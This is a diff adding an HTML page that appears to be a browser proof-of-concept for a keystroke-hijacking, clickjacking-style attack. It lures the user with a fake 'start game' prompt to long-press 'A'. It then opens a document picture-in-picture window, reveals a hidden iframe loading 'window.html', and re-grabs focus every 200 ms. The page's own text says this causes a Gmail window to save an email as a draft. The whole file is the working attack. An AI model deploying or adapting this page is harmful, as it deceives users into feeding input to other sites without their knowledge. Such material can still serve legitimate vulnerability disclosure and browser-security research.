@@ -1,0 +1,44 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+        
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    </head>
+
+
+<body>
+    
+	<div>
+    <h2>1. Long Press Key A To Start Game</h2>
+	<p></p>
+	<h2>2. Press Space bar.</h2>
+	<p></p>
+	<h2>That's it! The Gmail window should close after 6 seconds, thereby saving the email as draft!</h2>
+	<div>
+
+<iframe id="ifr" src="_blank" width="1%" height="1%" style="display:none;"></iframe>
+
+
+<script>
+
+var isWindowOpened = false;
+  
+document.onkeydown = function(e) {
+  if(e.key == "a" && !isWindowOpened){
+  window.documentPictureInPicture.requestWindow();
+  
+  document.getElementById("ifr").src = "window.html";
+  document.getElementById("ifr").style.display = "";
+  isWindowOpened = true;
+  }
+}
+
+ setInterval(function(){
+ window.focus();
+ }, 200);
+  
+</script>
+    
+
+</body>
+</html>
